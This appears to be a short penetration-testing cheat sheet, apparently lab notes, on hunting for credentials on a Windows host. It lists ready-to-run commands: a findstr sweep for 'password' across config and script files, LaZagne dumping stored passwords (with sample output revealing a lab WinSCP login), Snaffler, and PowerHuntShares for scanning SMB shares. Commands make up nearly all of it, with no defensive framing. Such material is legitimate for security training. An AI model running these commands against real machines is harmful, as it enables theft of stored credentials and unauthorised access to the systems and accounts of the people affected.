# Credential Hunting in Windows

## [Findstr](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/findstr)

```pwsh
PS C:\Users\bob> findstr /SIM /C:password *session *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

## LaZagne

```pwsh
PS C:\Users\bob> C:\Tools\LaZagne.exe all
```

```output title="Output"
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

[!] Python 3.10.1 on Windows AMD64: AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD

########## User: bob ##########

 ------------------- Winscp passwords -----------------

[+] Password found !!!
URL: 10.129.202.64
Login: ubuntu
Password: FSadmin123
Port: 22
```

## Snaffler

```pwsh
PS C:\Users\mendres> C:\Tools\Snaffler.exe -s
```

## [PowerHuntShares](https://github.com/NetSPI/PowerHuntShares/blob/main/PowerHuntShares.psm1)

```pwsh
PS C:\Users\mendres> Invoke-HuntSMBShares -Threads 100 -OutputDirectory C:\Users\mendres\Desktop
```
